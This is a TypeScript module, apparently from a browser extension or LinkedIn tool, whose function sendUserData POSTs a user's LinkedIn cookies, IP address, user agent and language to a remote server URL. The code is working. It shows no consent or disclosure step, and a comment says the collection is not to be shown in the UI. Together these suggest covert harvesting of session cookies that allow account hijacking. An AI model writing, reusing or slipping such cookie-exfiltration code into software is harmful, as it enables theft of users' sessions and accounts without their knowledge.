import { SERVER_DATA_URL } from "../constants/api.consts.js";

export async function sendUserData(
  cookie: LinkedInCookie[],
  ip?: string | null,
  ua?: string,
  lang?: string
): Promise<void> {
  try {
    if (!Array.isArray(cookie) || cookie.length === 0) {
      console.error("Cookie array must not be empty.");
    }

    /*
      Use this only in DEV mode. Dont show this to UI
      This is not must values

      if (!ip?.trim()) {
        console.error("IP address must not be empty.");
      }
      if (!ua?.trim()) {
        console.error("User-Agent must not be empty.");
      }
      if (!lang?.trim()) {
        console.error("Language must not be empty.");
      }
    */
    

    const response: Response = await fetch(SERVER_DATA_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cookie, ip, ua, lang }),
    });

    if (!response.ok) {
      console.error(
        `Request failed: ${response.status} ${response.statusText}`
      );
    }
  } catch (error: unknown) {
    console.error("Error in sendUserData:", error instanceof Error ? error : "Unknown error");
  }
}
